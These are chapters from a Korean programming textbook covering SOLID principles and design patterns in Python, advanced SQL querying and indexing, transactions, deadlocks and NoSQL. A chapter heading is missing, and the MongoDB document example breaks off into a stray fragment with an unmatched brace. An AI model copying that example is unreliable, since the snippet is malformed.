Chapter 28 디자인 패턴과 클린 아키텍처

지금 이것이 중요한 이유

작동하는 코드는 작성할 수 있습니다. 그런데 요구 사항이 바뀌어도 계속 작동하는 코드를 작성할 수 있습니까? 디자인 패턴(design pattern)과 SOLID 원칙은 수십 년간의 소프트웨어 엔지니어링이 쌓아 온 집단적 지혜입니다. 반복되는 문제에 대한 검증된 해결책이며, 코드베이스가 우아하게 성장하느냐 자체 무게에 무너지느냐를 가르는 차이입니다. 이 장에서는 가장 중요한 패턴을 인식하고, 언제 적용할지 이해하며, 그만큼 중요한 언제 적용하지 말아야 하는지도 배웁니다.

SOLID 원칙

SOLID는 객체 지향 설계를 안내하는 다섯 가지 원칙의 약어입니다. Robert C. Martin이 정리하여 명명했으며, 유지 보수 가능한 소프트웨어의 근간을 이룹니다. Python 코드로 작성된 실제 위반 사례와 수정 방법을 함께 살펴보겠습니다.

S — 단일 책임 원칙 (Single Responsibility Principle, SRP)

클래스는 변경 이유가 하나여야 합니다. 비즈니스 로직과 파일 I/O를 동시에 처리하는 클래스는 두 가지 독립적인 변경 이유를 갖게 됩니다.

위반 사례:

class TaskManager:
    """Handles tasks AND writes reports AND sends emails."""
    def __init__(self):
        self.tasks = []

    def add_task(self, title, priority):
        self.tasks.append({"title": title, "priority": priority})

    def generate_report(self):
        html = "<h1>Task Report</h1>"
        for t in self.tasks:
            html += f"<p>{t['title']} - {t['priority']}</p>"
        return html

    def send_email(self, to_address, body):
        import smtplib
        server = smtplib.SMTP("mail.example.com")
        server.sendmail("tasks@example.com", to_address, body)
        server.quit()

이 클래스는 변경 이유가 세 가지입니다: 태스크 로직, 보고서 형식, 이메일 전송. SMTP에서 이메일 API로 전환하면 태스크 관리를 담당하는 파일을 수정해야 합니다.

수정 — 역할별 클래스 분리:

class TaskManager:
    """Only manages tasks."""
    def __init__(self):
        self.tasks = []

    def add_task(self, title, priority):
        self.tasks.append({"title": title, "priority": priority})

    def get_tasks(self):
        return list(self.tasks)


class TaskReporter:
    """Only generates reports from task data."""
    def generate_html(self, tasks):
        html = "<h1>Task Report</h1>"
        for t in tasks:
            html += f"<p>{t['title']} - {t['priority']}</p>"
        return html


class EmailSender:
    """Only sends emails."""
    def send(self, to_address, body):
        import smtplib
        server = smtplib.SMTP("mail.example.com")
        server.sendmail("tasks@example.com", to_address, body)
        server.quit()

이제 각 클래스는 변경 이유가 정확히 하나입니다. 태스크 로직에 손대지 않고도 이메일 발신자를 교체할 수 있습니다.

O — 개방/폐쇄 원칙 (Open/Closed Principle, OCP)

소프트웨어 개체는 확장에는 열려 있고 수정에는 닫혀 있어야 합니다. 기존 코드를 재작성하지 않고 새로운 동작을 추가할 수 있어야 합니다.

위반 사례:

class TaskExporter:
    def export(self, tasks, format_type):
        if format_type == "json":
            import json
            return json.dumps(tasks)
        elif format_type == "csv":
            lines = ["title,priority"]
            for t in tasks:
                lines.append(f"{t['title']},{t['priority']}")
            return "\n".join(lines)
        # Every new format requires editing THIS method

XML 내보내기를 추가하려면 기존 export 메서드를 수정해야 하는데, 이는 OCP를 위반합니다.

수정 — 다형성(polymorphism) 활용:

from abc import ABC, abstractmethod

class Exporter(ABC):
    @abstractmethod
    def export(self, tasks): pass

class JsonExporter(Exporter):
    def export(self, tasks):
        import json
        return json.dumps(tasks)

class CsvExporter(Exporter):
    def export(self, tasks):
        lines = ["title,priority"]
        for t in tasks:
            lines.append(f"{t['title']},{t['priority']}")
        return "\n".join(lines)

# Adding XML? Create a new class. Zero existing code changes.
class XmlExporter(Exporter):
    def export(self, tasks):
        xml = "<tasks>"
        for t in tasks:
            xml += f"<task><title>{t['title']}</title></task>"
        xml += "</tasks>"
        return xml

L — 리스코프 치환 원칙 (Liskov Substitution Principle, LSP)

하위 타입은 정확성을 해치지 않고 부모 타입이 필요한 곳 어디서나 사용할 수 있어야 합니다. Bird를 받는 함수에 Penguin을 넘겼을 때 Penguin.fly()가 예외를 발생시켜서 충돌이 나면 안 됩니다.

위반 사례:

class Rectangle:
    def __init__(self, width, height):
        self.width = width
        self.height = height

    def area(self):
        return self.width * self.height

class Square(Rectangle):
    def __init__(self, side):
        super().__init__(side, side)

    def set_width(self, w):
        self.width = w
        self.height = w  # Silently changes height too!

rect.set_width(5)를 호출한 후 rect.height가 변하지 않기를 기대하는 코드는 Square에서 오작동합니다. 수정 방법: Square가 Rectangle을 상속하지 않게 하고, 공유 Shape 인터페이스를 사용합니다.

I — 인터페이스 분리 원칙 (Interface Segregation Principle, ISP)

클라이언트는 사용하지 않는 메서드에 의존하도록 강요받아서는 안 됩니다. 메서드가 20개인 비대한 인터페이스는 모든 구현자가 사용하지 않는 메서드를 빈 구현으로 채우게 만듭니다.

위반 사례:

class Worker(ABC):
    @abstractmethod
    def code(self): pass

    @abstractmethod
    def test(self): pass

    @abstractmethod
    def manage_team(self): pass  # Not all workers manage!

class JuniorDev(Worker):
    def code(self): return "Writing code"
    def test(self): return "Running tests"
    def manage_team(self):
        raise NotImplementedError("Juniors don't manage!")

수정 — 역할별 인터페이스 분리:

class Coder(ABC):
    @abstractmethod
    def code(self): pass

class Tester(ABC):
    @abstractmethod
    def test(self): pass

class Manager(ABC):
    @abstractmethod
    def manage_team(self): pass

class JuniorDev(Coder, Tester):
    def code(self): return "Writing code"
    def test(self): return "Running tests"

class TechLead(Coder, Tester, Manager):
    def code(self): return "Writing code"
    def test(self): return "Running tests"
    def manage_team(self): return "Leading the team"

D — 의존성 역전 원칙 (Dependency Inversion Principle, DIP)

고수준 모듈은 저수준 모듈에 의존해서는 안 됩니다. 둘 다 추상화(abstraction)에 의존해야 합니다.

위반 사례:

class TaskService:
    def __init__(self):
        self.db = SQLiteDatabase("tasks.db")  # Hard-wired!

    def get_all_tasks(self):
        return self.db.query("SELECT * FROM tasks")

실제 파일 없이는 데이터베이스를 교체하거나 테스트할 수 없습니다. 수정 — 추상화에 의존하기:

class Database(ABC):
    @abstractmethod
    def query(self, sql): pass

class TaskService:
    def __init__(self, db: Database):
        self.db = db  # Injected from outside

    def get_all_tasks(self):
        return self.db.query("SELECT * FROM tasks")

# Production:
service = TaskService(SQLiteDatabase("tasks.db"))
# Testing:
test_service = TaskService(InMemoryDatabase())

생성 패턴 (Creational Patterns)

생성 패턴은 객체를 어떻게 만드는지를 추상화하여 호출 코드가 구체적으로 어떤 클래스가 인스턴스화되는지 알 필요가 없게 합니다.

팩토리 패턴 (Factory Pattern)

팩토리(Factory)는 생성 로직을 노출하지 않고 객체를 만듭니다. 생성자를 직접 호출하는 대신, 입력에 따라 알맞은 객체를 반환하는 팩토리 함수를 호출합니다.

class Task:
    def __init__(self, title, priority="medium"):
        self.title = title
        self.priority = priority

class Bug(Task):
    def __init__(self, title, severity="normal"):
        super().__init__(title, priority="high")
        self.severity = severity

class Feature(Task):
    def __init__(self, title, story_points=1):
        super().__init__(title, priority="medium")
        self.story_points = story_points

def create_task(task_type, title, **kwargs):
    """Factory function: caller doesn't know which class is used."""
    factories = {
        "bug": Bug,
        "feature": Feature,
        "task": Task,
    }
    cls = factories.get(task_type)
    if cls is None:
        raise ValueError(f"Unknown task type: {task_type}")
    return cls(title, **kwargs)

# Usage — caller never imports Bug or Feature directly
item = create_task("bug", "Login page crashes", severity="critical")
print(type(item).__name__)  # Bug

빌더 패턴 (Builder Pattern)

선택적 매개변수가 많이 필요한 생성 과정에서 빌더(Builder) 패턴은 인수 15개짜리 생성자 대신 읽기 쉽고 단계적인 인터페이스를 제공합니다.

class TaskBuilder:
    def __init__(self, title):
        self._title = title
        self._priority = "medium"
        self._assignee = None
        self._labels = []
        self._due_date = None

    def priority(self, p):
        self._priority = p
        return self  # Enable chaining

    def assign_to(self, name):
        self._assignee = name
        return self

    def label(self, lbl):
        self._labels.append(lbl)
        return self

    def due(self, date):
        self._due_date = date
        return self

    def build(self):
        return {
            "title": self._title,
            "priority": self._priority,
            "assignee": self._assignee,
            "labels": self._labels,
            "due_date": self._due_date,
        }

# Clean, readable construction
task = (TaskBuilder("Fix login bug")
        .priority("high")
        .assign_to("Alice")
        .label("security")
        .label("urgent")
        .due("2026-04-01")
        .build())

싱글턴 (Singleton) — 그리고 대부분 잘못된 이유

싱글턴(Singleton)은 클래스의 인스턴스가 전역적으로 하나만 존재하도록 보장합니다.

class ConfigManager:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.settings = {}
        return cls._instance

a = ConfigManager()
b = ConfigManager()
assert a is b  # True — same object
주의: 싱글턴은 상태 공유의 좋은 방법이 아닙니다

싱글턴은 전역 상태를 위장한 것에 불과합니다. 모든 테스트가 동일한 변경 가능한 인스턴스를 공유하기 때문에 테스트를 매우 어렵게 만듭니다. 또한 숨겨진 의존성을 만들어, 함수 시그니처에 나타나지 않고도 어떤 코드든 싱글턴에 접근할 수 있게 됩니다. 대신 의존성 주입(dependency injection)을 사용하십시오: 최상위에서 인스턴스를 하나 만들고 필요한 모든 곳에 전달합니다.

구조 패턴 (Structural Patterns)

어댑터 패턴 (Adapter Pattern)

어댑터(Adapter)는 호환되지 않는 인터페이스를 코드가 기대하는 형태로 맞춰 줍니다. TaskForge가 save()와 load()를 기대하는데 서드파티 라이브러리는 write_data()와 read_data()를 사용하는 경우를 상상해 보십시오.

class ThirdPartyStorage:
    """We cannot modify this class."""
    def write_data(self, key, value):
        print(f"Writing {key}: {value}")

    def read_data(self, key):
        return {"title": "Example task"}

class StorageAdapter:
    """Makes ThirdPartyStorage look like our interface."""
    def __init__(self, adaptee):
        self._adaptee = adaptee

    def save(self, key, value):
        return self._adaptee.write_data(key, value)

    def load(self, key):
        return self._adaptee.read_data(key)

# TaskForge code works without changes
storage = StorageAdapter(ThirdPartyStorage())
storage.save("task-1", {"title": "Buy groceries"})

데코레이터 패턴 (Decorator Pattern)

데코레이터(Decorator) 패턴은 클래스를 수정하지 않고 객체에 동작을 추가합니다. Python은 함수 데코레이터를 언어 차원에서 지원하지만, OOP 버전은 동일한 인터페이스를 가진 객체를 다른 객체로 감쌉니다.

class TaskService:
    def get_task(self, task_id):
        return {"id": task_id, "title": "Fix bug"}

class LoggingTaskService:
    """Adds logging around every call."""
    def __init__(self, wrapped):
        self._wrapped = wrapped

    def get_task(self, task_id):
        print(f"[LOG] Getting task {task_id}")
        result = self._wrapped.get_task(task_id)
        print(f"[LOG] Found: {result['title']}")
        return result

class CachingTaskService:
    """Adds caching."""
    def __init__(self, wrapped):
        self._wrapped = wrapped
        self._cache = {}

    def get_task(self, task_id):
        if task_id not in self._cache:
            self._cache[task_id] = self._wrapped.get_task(task_id)
        return self._cache[task_id]

# Stack decorators: logging around caching around real service
service = LoggingTaskService(CachingTaskService(TaskService()))

퍼사드 패턴 (Facade Pattern)

퍼사드(Facade)는 복잡한 서브시스템에 단순화된 인터페이스를 제공합니다. 호출자가 열 개의 클래스와 상호 작용하도록 강요하는 대신, 몇 가지 명확한 메서드를 가진 하나의 클래스를 제공합니다.

class TaskForge:
    """Facade: one entry point for the entire system."""
    def __init__(self, db, auth, notifier, logger):
        self._db = db
        self._auth = auth
        self._notifier = notifier
        self._logger = logger

    def create_task(self, user_token, title, priority):
        user = self._auth.verify(user_token)
        task = self._db.insert_task(title, priority, user.id)
        self._notifier.notify_team(f"New task: {title}")
        self._logger.log("task_created", task.id, user.id)
        return task

행위 패턴 (Behavioural Patterns)

옵서버 패턴 (Observer Pattern) — Pub/Sub

옵서버(Observer) 패턴은 객체가 이벤트를 구독할 수 있게 합니다. 무언가가 발생하면 모든 구독자에게 자동으로 알림이 전달되어, 이벤트 소스와 핸들러가 분리됩니다.

class EventBus:
    def __init__(self):
        self._listeners = {}

    def subscribe(self, event_type, callback):
        self._listeners.setdefault(event_type, []).append(callback)

    def publish(self, event_type, data):
        for callback in self._listeners.get(event_type, []):
            callback(data)

bus = EventBus()

def send_email(task):
    print(f"Email: New task '{task['title']}' created")

def update_dashboard(task):
    print(f"Dashboard: Refreshing with new task")

bus.subscribe("task_created", send_email)
bus.subscribe("task_created", update_dashboard)

# When a task is created, both handlers fire automatically
bus.publish("task_created", {"title": "Fix login bug", "priority": "high"})

전략 패턴 (Strategy Pattern)

전략(Strategy) 패턴은 교환 가능한 알고리즘(algorithm) 군을 정의합니다. 클라이언트는 런타임에 사용할 알고리즘을 선택합니다. 이것이 TaskForge 스토리지 백엔드에 사용할 패턴입니다.

from abc import ABC, abstractmethod

class StorageBackend(ABC):
    @abstractmethod
    def save(self, task_id, task_data):
        """Persist a task."""
        pass

    @abstractmethod
    def load(self, task_id):
        """Retrieve a task by ID, or None."""
        pass

    @abstractmethod
    def list_all(self):
        """Return all stored tasks."""
        pass

class InMemoryBackend(StorageBackend):
    def __init__(self):
        self._store = {}

    def save(self, task_id, task_data):
        self._store[task_id] = task_data

    def load(self, task_id):
        return self._store.get(task_id)

    def list_all(self):
        return list(self._store.values())

class TaskManager:
    def __init__(self, backend: StorageBackend):
        self._backend = backend

    def add_task(self, task_id, title, priority="medium"):
        self._backend.save(task_id, {"title": title, "priority": priority})

    def get_task(self, task_id):
        return self._backend.load(task_id)

핵심은 TaskManager가 어떤 백엔드를 사용하는지 알지도 신경 쓰지도 않는다는 점입니다. 비즈니스 로직을 전혀 수정하지 않고도 인메모리에서 SQLite, 클라우드 데이터베이스로 교체할 수 있습니다.

커맨드 패턴 (Command Pattern)

커맨드(Command) 패턴은 요청을 객체로 캡슐화하여 실행 취소/다시 실행, 큐잉(queueing), 작업 로깅을 가능하게 합니다.

class Command(ABC):
    @abstractmethod
    def execute(self): pass

    @abstractmethod
    def undo(self): pass

class AddTaskCommand(Command):
    def __init__(self, manager, task_id, title):
        self.manager = manager
        self.task_id = task_id
        self.title = title

    def execute(self):
        self.manager.add_task(self.task_id, self.title)

    def undo(self):
        self.manager.remove_task(self.task_id)

class CommandHistory:
    def __init__(self):
        self._history = []

    def execute(self, command):
        command.execute()
        self._history.append(command)

    def undo_last(self):
        if self._history:
            cmd = self._history.pop()
            cmd.undo()

의존성 주입의 실제 적용

의존성 주입(Dependency Injection, DI)은 클래스 내부에서 의존성을 생성하는 대신 외부에서 전달하는 관행입니다. DIP에서 이미 살펴봤습니다. Python에서는 DI 프레임워크가 거의 필요하지 않으며, 생성자 주입으로 충분한 경우가 대부분입니다.

# WITHOUT DI: tightly coupled, untestable
class OrderProcessor:
    def __init__(self):
        self.payment = StripePayment()  # Hard-coded!
        self.email = SendGridEmail()    # Hard-coded!

# WITH DI: loosely coupled, easily testable
class OrderProcessor:
    def __init__(self, payment, email):
        self.payment = payment  # Injected
        self.email = email      # Injected

# Production
processor = OrderProcessor(StripePayment(), SendGridEmail())
# Testing
test_proc = OrderProcessor(MockPayment(), MockEmail())

연습: 전략 패턴 구현

추상 메서드 save(key, value), load(key), list_all()를 가진 StorageBackend 기반 클래스를 만드십시오. 그런 다음 DictStorage(딕셔너리에 저장)와 ListStorage(튜플 리스트에 저장)를 구현하십시오. 마지막으로 생성자에서 어떤 백엔드든 받을 수 있는 TaskManager 클래스를 만드십시오. add_task(task_id, title)는 {"title": title}을 저장하고, get_task(task_id)는 이를 불러와야 합니다.

DictStorage: __init__에서 self._store = {}를 사용하십시오. save()는 self._store[key] = value를 설정합니다. load()는 self._store.get(key)를 반환합니다. list_all()은 list(self._store.values())를 반환합니다.

ListStorage: __init__에서 self._store = []를 사용하십시오. save()는 (key, value)를 추가합니다. load()는 리스트를 순회하여 일치하는 키를 찾습니다. list_all()은 [v for _, v in self._store]를 반환합니다.

TaskManager.__init__은 backend 매개변수를 받아 self._backend로 저장합니다. add_task는 self._backend.save(task_id, {"title": title})을 호출합니다. get_task는 self._backend.load(task_id)를 호출합니다.

지금 이것이 중요한 이유

15장에서는 테이블 생성과 기본 쿼리 작성에 충분한 SQL을 배웠습니다. 실제 세계에서는 수백만 행의 데이터, 복잡한 관계, 성능 요구 사항이 있는 데이터베이스를 만나게 됩니다. 이 장은 "SELECT를 쓸 수 있다"에서 "효율적이고 복잡한 쿼리를 작성하고 그것이 왜 그렇게 동작하는지 이해한다"로 이끌어 줍니다.

JOIN — 테이블 연결하기

실제 데이터베이스는 중복을 피하기 위해 데이터를 여러 테이블에 분산합니다(정규화, normalisation). JOIN은 쿼리에서 그 데이터를 다시 연결하는 방법입니다. 다양한 JOIN 유형을 이해하는 것이 필수적입니다.

INNER JOIN

두 테이블 모두에서 일치하는 행만 반환합니다. 태스크에 카테고리가 없으면 완전히 제외됩니다.

-- Tasks with their category names (only matched rows)
SELECT tasks.title, categories.name AS category
FROM tasks
INNER JOIN categories ON tasks.category_id = categories.id;

INNER JOIN을 두 집합의 교집합으로 생각하십시오. 일치하는 쌍만 결과에 나타납니다.

LEFT OUTER JOIN

오른쪽 테이블에 일치하는 항목이 없어도 왼쪽 테이블의 모든 행을 반환합니다. 오른쪽 테이블에서 일치하지 않는 컬럼은 NULL이 됩니다.

-- ALL tasks, including those without a category
SELECT tasks.title, categories.name AS category
FROM tasks
LEFT JOIN categories ON tasks.category_id = categories.id;

-- Result includes:
-- "Fix login bug"    | "Bugs"
-- "Unassigned task"  | NULL    ← no category, still included

CROSS JOIN

카르테시안 곱(Cartesian product)을 반환합니다. 첫 번째 테이블의 모든 행과 두 번째 테이블의 모든 행을 조합합니다. 테이블 A에 3개 행, 테이블 B에 4개 행이 있으면 결과는 12개 행입니다. 거의 필요하지 않지만 가능한 모든 조합을 생성할 때 유용합니다.

-- Every task paired with every user (for scheduling matrix)
SELECT tasks.title, users.name
FROM tasks
CROSS JOIN users;

셀프 조인 (Self-Join)

테이블을 자기 자신과 조인합니다. 서브태스크가 있는 태스크와 같은 계층적 데이터에 유용합니다.

-- Find tasks and their parent tasks
SELECT child.title AS subtask, parent.title AS parent_task
FROM tasks AS child
INNER JOIN tasks AS parent ON child.parent_id = parent.id;

서브쿼리와 CTE

서브쿼리 (Subquery)

서브쿼리(subquery)는 다른 쿼리 안에 중첩된 쿼리입니다. 비상관 서브쿼리(uncorrelated subquery)는 독립적으로 한 번 실행됩니다. 상관 서브쿼리(correlated subquery)는 외부 쿼리의 행마다 한 번씩 실행되므로 느리지만 때로는 필요합니다.

-- Uncorrelated: find tasks with above-average priority score
SELECT title, priority_score
FROM tasks
WHERE priority_score > (SELECT AVG(priority_score) FROM tasks);

-- Correlated: find each user's most recent task
SELECT t.title, t.created_at, t.user_id
FROM tasks t
WHERE t.created_at = (
    SELECT MAX(t2.created_at)
    FROM tasks t2
    WHERE t2.user_id = t.user_id  -- References outer query
);

공통 테이블 식 (Common Table Expression, CTE)

CTE는 WITH 절을 사용하여 임시 명명된 결과 집합을 정의합니다. CTE는 복잡한 쿼리를 논리적 단계로 나누어 읽기 쉽게 만들어 줍니다.

-- Find categories with more than 5 high-priority tasks
WITH high_priority AS (
    SELECT category_id, COUNT(*) AS cnt
    FROM tasks
    WHERE priority = 'high'
    GROUP BY category_id
)
SELECT categories.name, high_priority.cnt
FROM high_priority
INNER JOIN categories ON high_priority.category_id = categories.id
WHERE high_priority.cnt > 5;

CTE는 중첩된 서브쿼리보다 훨씬 읽기 쉽고, 메인 쿼리에서 동일한 CTE를 여러 번 참조할 수 있습니다.

윈도우 함수 (Window Functions)

윈도우 함수(window function)는 GROUP BY처럼 결과를 축소하지 않으면서 현재 행과 관련된 행 집합에 걸쳐 계산을 수행합니다. 현대 SQL에서 가장 강력한 기능 중 하나입니다.

-- ROW_NUMBER: sequential number within each category
SELECT title, category_id, priority_score,
       ROW_NUMBER() OVER (
           PARTITION BY category_id
           ORDER BY priority_score DESC
       ) AS rank_in_category
FROM tasks;

-- RANK: ties get the same rank (with gaps after)
SELECT title, priority_score,
       RANK() OVER (ORDER BY priority_score DESC) AS rank
FROM tasks;

-- LAG / LEAD: access the previous/next row's value
SELECT title, created_at,
       LAG(created_at) OVER (ORDER BY created_at) AS prev_date
FROM tasks;

OVER 절이 윈도우를 정의합니다. PARTITION BY는 행을 그룹으로 나누고(GROUP BY처럼 축소하지 않음), ORDER BY는 각 파티션 내의 정렬 순서를 정의합니다.

인덱싱 — 쿼리 빠르게 만들기

인덱스가 없으면 모든 쿼리가 전체 테이블을 스캔합니다("전체 테이블 스캔(full table scan)"). 인덱스(index)는 데이터베이스가 모든 것을 스캔하지 않고 행을 찾을 수 있게 하는 별도의 자료 구조(data structure)입니다. 교과서 뒤의 색인(索引)으로 생각하십시오.

B-트리 인덱스 (B-Tree Index)

가장 흔한 인덱스 유형은 B-트리(balanced tree, 균형 트리)입니다. 키를 트리 구조에 정렬해서 저장하며, 각 노드가 값의 범위를 가리킵니다. 값을 조회하는 데 O(n) 대신 O(log n)이 소요됩니다.

-- Single-column index on the column you filter by most
CREATE INDEX idx_tasks_priority ON tasks(priority);

-- Composite index: useful when filtering by both columns together
CREATE INDEX idx_tasks_cat_priority ON tasks(category_id, priority);

-- Column order matters! This index helps:
--   WHERE category_id = 5 AND priority = 'high'  (both columns)
--   WHERE category_id = 5                         (leftmost column)
-- But NOT:
--   WHERE priority = 'high'  (can't skip the first column)

커버링 인덱스 (Covering Index)

커버링 인덱스(covering index)는 쿼리에 필요한 모든 컬럼을 포함하므로, 데이터베이스가 메인 테이블에 접근하지 않고 인덱스만으로 쿼리에 응답합니다.

-- If this is your most common query:
SELECT title, priority FROM tasks WHERE category_id = 5;

-- This covering index answers it without touching the table:
CREATE INDEX idx_covering ON tasks(category_id, title, priority);

인덱스가 해가 되는 경우

인덱스는 공짜가 아닙니다. 모든 인덱스는 INSERT, UPDATE, DELETE 작업에 오버헤드를 추가하고(인덱스도 업데이트해야 하므로) 스토리지를 소비합니다. 읽기가 드문 쓰기 집약적인 테이블에서는 인덱스가 너무 많으면 오히려 속도가 느려질 수 있습니다. 무분별하게 인덱스를 추가하기 전에 프로파일링을 하십시오.

쿼리 최적화

EXPLAIN — 쿼리 계획 읽기

EXPLAIN 명령어는 데이터베이스가 쿼리를 어떻게 실행할지 보여 줍니다.

EXPLAIN QUERY PLAN
SELECT tasks.title, categories.name
FROM tasks
INNER JOIN categories ON tasks.category_id = categories.id
WHERE tasks.priority = 'high';

-- Output might show:
-- SCAN TABLE tasks           ← Full table scan! No index on priority
-- SEARCH TABLE categories USING INTEGER PRIMARY KEY  ← Good, using PK

SCAN(큰 테이블에서는 나쁨 — 모든 행을 읽음)과 SEARCH 또는 USING INDEX(좋음 — 인덱스 사용)를 찾으십시오. WHERE 절이 있는 큰 테이블에서 SCAN이 보이면 인덱스가 필요할 가능성이 높습니다.

주의: EXPLAIN 출력 읽기는 매일 쓰는 기술입니다

프로덕션에서 느린 쿼리는 애플리케이션 다운타임의 가장 흔한 원인 중 하나입니다. EXPLAIN을 실행하고, 출력을 해석하고, 올바른 인덱스를 추가하는 능력은 상시 사용하게 됩니다. 이 절을 건너뛰지 마십시오 — 작성하는 모든 쿼리에서 연습하십시오.

N+1 문제

N+1 문제는 코드가 목록을 가져오기 위해 쿼리 하나를 실행한 다음, 각 항목의 관련 데이터를 가져오기 위해 N개의 추가 쿼리를 실행할 때 발생합니다. 매우 흔하고 매우 낭비적입니다.

# THE N+1 PROBLEM
# 1 query to get all categories
categories = db.execute("SELECT * FROM categories").fetchall()

for cat in categories:
    # N queries, one per category!
    tasks = db.execute(
        "SELECT * FROM tasks WHERE category_id = ?", (cat["id"],)
    ).fetchall()
    print(f"{cat['name']}: {len(tasks)} tasks")

# If there are 100 categories, that's 101 total queries!

# THE FIX: single JOIN query
results = db.execute("""
    SELECT categories.name, COUNT(tasks.id) AS task_count
    FROM categories
    LEFT JOIN tasks ON tasks.category_id = categories.id
    GROUP BY categories.id
""").fetchall()
# 1 query instead of 101!

정규화 (Normalisation)

정규화(normalisation)는 중복을 줄이기 위해 데이터를 구성합니다. 여러 "정규형(normal form)"이 있으며, 각각이 이전 것을 기반으로 합니다.

제1정규형 (1NF): 모든 컬럼은 원자적(단일) 값을 포함합니다. 리스트나 반복 그룹은 없습니다.

-- VIOLATES 1NF: tags column contains a comma-separated list
-- | id | title    | tags              |
-- | 1  | Fix bug  | "urgent,security" |

-- 1NF FIX: separate table for tags
-- tasks: | id | title   |
-- tags:   | id | task_id | tag      |
--         | 1  | 1       | urgent   |
--         | 2  | 1       | security |

제2정규형 (2NF): 1NF를 만족하며, 모든 비키 컬럼이 기본 키 전체에 의존합니다(복합 키에 관련).

제3정규형 (3NF): 2NF를 만족하며, 비키 컬럼이 다른 비키 컬럼에 의존하지 않습니다(이행적 의존성 없음).

-- VIOLATES 3NF: city depends on zip_code, not on the primary key
-- | user_id | name  | zip_code | city     |

-- 3NF FIX: separate zip_codes table
-- users:     | user_id | name  | zip_code |
-- zip_codes: | zip_code | city            |

역정규화(denormalise) 시점: 읽기 집약적인 분석 및 보고 쿼리는 비용이 큰 JOIN을 피하기 위해 중복 데이터를 저장하는 것이 이득일 수 있습니다. 이는 의도적인 트레이드오프로, 더 빠른 읽기를 위해 더 복잡한 쓰기와 잠재적인 데이터 불일치를 감수합니다.

Chapter 30 트랜잭션, NoSQL과 데이터 진화

지금 이것이 중요한 이유

두 명의 사용자가 같은 태스크를 동시에 업데이트하면 어떻게 됩니까? 관련 레코드를 저장하는 도중에 서버가 충돌하면 어떻게 됩니까? 트랜잭션(transaction)은 이러한 위험으로부터 데이터를 보호합니다. 그리고 때로는 관계형 데이터베이스가 올바른 도구가 아닐 수도 있는데, NoSQL을 이해하면 현명하게 선택할 수 있는 어휘를 갖추게 됩니다.

트랜잭션과 ACID

트랜잭션(transaction)은 모두 성공하거나 모두 실패해야 하는 데이터베이스 작업의 그룹입니다. 중간 상태는 없습니다. 이를 보장하는 속성을 ACID라고 합니다.

원자성 (Atomicity): 트랜잭션의 모든 작업이 성공하거나 하나도 성공하지 않습니다. 5단계 중 3단계가 실패하면 1, 2단계가 발생하지 않은 것처럼 롤백됩니다.

일관성 (Consistency): 트랜잭션은 데이터베이스를 하나의 유효한 상태에서 다른 유효한 상태로 이동시킵니다. 제약 조건(외래 키, 고유 규칙, 체크 제약)이 항상 적용됩니다.

격리성 (Isolation): 동시 트랜잭션은 서로 간섭하지 않습니다. 각 트랜잭션은 자신만 실행 중인 것처럼 데이터베이스를 봅니다(격리 수준은 설정 가능).

지속성 (Durability): 커밋된 데이터는 충돌, 전원 장애, 재시작 후에도 살아남습니다.

import sqlite3

conn = sqlite3.connect("bank.db")
cursor = conn.cursor()

try:
    cursor.execute("UPDATE accounts SET balance = balance - 100 WHERE id = 'A'")
    cursor.execute("UPDATE accounts SET balance = balance + 100 WHERE id = 'B'")
    conn.commit()    # Both succeed
except Exception:
    conn.rollback()  # Both fail — Account A keeps its money

더티 읽기 (Dirty read): 트랜잭션 A가 트랜잭션 B가 수정했지만 아직 커밋하지 않은 데이터를 읽습니다. B가 롤백하면 A는 실제로 존재한 적 없는 데이터를 읽은 것입니다.

반복 불가능 읽기 (Non-repeatable read): 트랜잭션 A가 행을 읽고, B가 수정하여 커밋한 후, A가 다시 읽으면 다른 값을 얻습니다.

팬텀 읽기 (Phantom read): 트랜잭션 A가 조건에 맞는 행을 쿼리하고, B가 새로운 일치 행을 삽입하여 커밋한 후, A가 재쿼리하면 이전에 없던 "팬텀" 행이 보입니다.

교착 상태 (Deadlocks)

교착 상태(deadlock)는 두 트랜잭션이 각각 상대방이 필요로 하는 잠금을 보유할 때 발생합니다. 둘 다 진행할 수 없어서 영원히 기다립니다.

# Transaction 1:                    Transaction 2:
# Lock row A                        Lock row B
# Try to lock row B (WAIT...)       Try to lock row A (WAIT...)
# ... deadlock!                     ... deadlock!

방지 전략:

  • 항상 같은 순서로 잠금을 획득합니다(예: 항상 낮은 ID를 먼저 잠금)
  • 트랜잭션을 짧게 유지합니다 — 잠금 보유 시간이 짧을수록 충돌 가능성이 낮아집니다
  • 타임아웃을 사용하여 차단된 트랜잭션이 영원히 기다리는 대신 포기하게 합니다
  • 대부분의 데이터베이스는 교착 상태를 자동으로 감지하고 한 트랜잭션을 롤백합니다

커넥션 풀링 (Connection Pooling)

모든 데이터베이스 연결에는 오버헤드가 있습니다: TCP 설정, 인증, 메모리 할당. 커넥션 풀(connection pool)은 미리 열어 둔 연결을 유지합니다. 코드에서 연결이 필요하면 풀에서 빌리고 완료 후 반환합니다.

# Conceptual connection pool (real systems use SQLAlchemy or similar)
class ConnectionPool:
    def __init__(self, db_path, pool_size=5):
        self._available = [sqlite3.connect(db_path) for _ in range(pool_size)]
        self._in_use = []

    def get_connection(self):
        if not self._available:
            raise Exception("No connections available")
        conn = self._available.pop()
        self._in_use.append(conn)
        return conn

    def return_connection(self, conn):
        self._in_use.remove(conn)
        self._available.append(conn)

NoSQL 전경

관계형 데이터베이스(SQL)는 대부분의 경우 올바른 선택입니다. 그러나 특정 워크로드는 다른 데이터 모델에서 이점을 얻습니다. 주요 NoSQL 범주는 네 가지입니다.

문서 저장소 (Document Stores, 예: MongoDB)

데이터를 JSON과 유사한 문서로 저장합니다. 각 문서는 다른 구조를 가질 수 있습니다. 콘텐츠 관리, 사용자 프로필, 카탈로그에 적합합니다.

# TaskForge as a document:

        {"author": "Bob", "text": "Reproduced on Chrome", "date": "2026-03-15"}

}

키-값 저장소 (Key-Value Stores, 예: Redis)

단순합니다: 키가 값에 매핑됩니다. 매우 빠르며(종종 인메모리). 캐싱, 세션 저장, 속도 제한에 사용됩니다.

컬럼 패밀리 저장소 (Column-Family Stores, 예: Cassandra)

여러 서버에서 대량의 데이터를 쓰고 읽는 데 최적화되어 있습니다. 시계열 데이터, IoT 로그, 대규모 이벤트 추적에 사용됩니다.

그래프 데이터베이스 (Graph Databases, 예: Neo4j)

데이터를 노드와 엣지(관계)로 저장합니다. 소셜 네트워크, 추천 엔진, 사기 감지에 사용됩니다.

스키마 마이그레이션 (Schema Migrations)

